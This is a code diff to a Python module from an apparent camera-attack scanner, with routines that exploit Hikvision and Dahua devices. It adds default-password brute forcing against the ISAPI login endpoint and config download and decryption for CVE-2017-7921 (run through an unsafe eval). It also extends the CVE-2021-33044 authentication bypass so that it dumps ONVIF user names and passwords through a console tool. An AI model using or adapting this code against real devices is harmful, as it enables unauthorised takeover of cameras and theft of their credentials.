@@ -1,13 +1,14 @@
 """Vulnerability Exploition"""
 import os
 import sys
+import time
 import hashlib
 import requests
 
 CWD = os.path.dirname(__file__)
 sys.path.append(os.path.join(CWD, '..'))
 from utils.net import get_user_agent
-from utils.config import USERS, PASSWORDS, TIMEOUT
+from utils.config import USERS, PASSWORDS, TIMEOUT, DEBUG
 
 
 def device_type(ip: str) -> list:
@@ -64,7 +65,8 @@ def cve_2017_7921(ip: str) -> list:
         rc = requests.get(config_url, timeout=TIMEOUT * 2, verify=False, headers=headers)
         with open(f"{ip}-config", 'wb') as f:
             f.write(rc.content)
-        info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
+        decryptor = os.path.join(CWD, 'lib/decrypt_configure.py')
+        info = eval(os.popen(f"python3 {decryptor} {ip}-config").readline().strip())
         idx = - info[::-1].index('admin')
         user, passwd = info[idx - 1], info[idx]
         os.remove(f"{ip}-config")
@@ -74,12 +76,12 @@ def cve_2017_7921(ip: str) -> list:
 
 def hik_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
     """(Hikvision) Brute"""
-    passwords = set(passwords + ['12345'])
+    passwords = set(passwords + ['12345', '888888'])
     headers = {'User-Agent': get_user_agent()}
     for user in users:
         for p in passwords:
-            r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=TIMEOUT, verify=False, headers=headers)
-            if 'IP CAMERA' in r.text or 'IPCamera' in r.text:
+            r = requests.get(f"http://{ip}/ISAPI/Security/userCheck", auth=(user, p), timeout=TIMEOUT, verify=False, headers=headers)
+            if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                 return [True, str(user), str(p), 'Hikvision', 'weak pass']
     return [False, ]
 
@@ -149,7 +151,36 @@ def cve_2021_33044(ip: str) -> list:
     }
     r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=TIMEOUT)
     if r.status_code == 200 and r.json()['result'] == True:
-        return [True, '', '', 'Dahua', 'cve-2021-33044']
+        if ':' in ip: ip, port = ip.split(':')
+        else: port = 80
+
+        def dh_console(proto='dhip'):
+            console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
+            user, paswd = '', ''
+            try:
+                with os.popen(f"""
+                (
+                    echo "OnvifUser -u"
+                    echo "quit all"
+                ) | python3 -Bu {console} --logon netkeyboard --rhost {ip} --rport {port} --proto {proto}
+                """) as f: items = [line.strip() for line in f]
+                for idx, val in enumerate(items):
+                    if 'Name' in val:
+                        user = val.split(':')[-1].strip().strip(',').replace('"', '') 
+                        passwd = items[idx + 1].split(':')[-1].strip().strip(',').replace('"', '')
+                        break
+            except Exception as e:
+                if DEBUG: print(e)
+            return user, passwd
+
+        # firstly, try the dhip
+        user, passwd = dh_console(proto='dhip')
+
+        # if not successed, try the http
+        if not user and not passwd:
+            user, passwd = dh_console(proto='http')
+
+        return [True, user, passwd, 'Dahua', 'cve-2021-33044']
     return [False, ]
 
 
@@ -193,24 +224,11 @@ def cctv_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
     return [False, ]
 
 
-def hb_weak(ip: str, users: list=USERS, passwords: list=PASSWORDS) -> list:
-    """(HB Teck / Hikvision<multiplay>) Brute"""
-    passwords = set(passwords + ['888888'])
-    headers = {'User-Agent': get_user_agent()}
-    for user in users:
-        for p in passwords:
-            r = requests.get(f"http://{ip}/ISAPI/Security/userCheck", verify=False, headers=headers, timeout=TIMEOUT, auth=(user, p))
-            if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
-                return [True, str(user), str(p), 'HB-Tech/Hikvision', 'weak pass']
-    return [False, ]
-
-
 modules = {
     'device_type': device_type,
 
-    # hikvision & hik_multiplay | hb_teck
+    # hikvision
     'hik_weak': hik_weak,
-    'hb_weak': hb_weak,
     'cve_2021_36260': cve_2021_36260,
     'cve_2017_7921': cve_2017_7921,
 
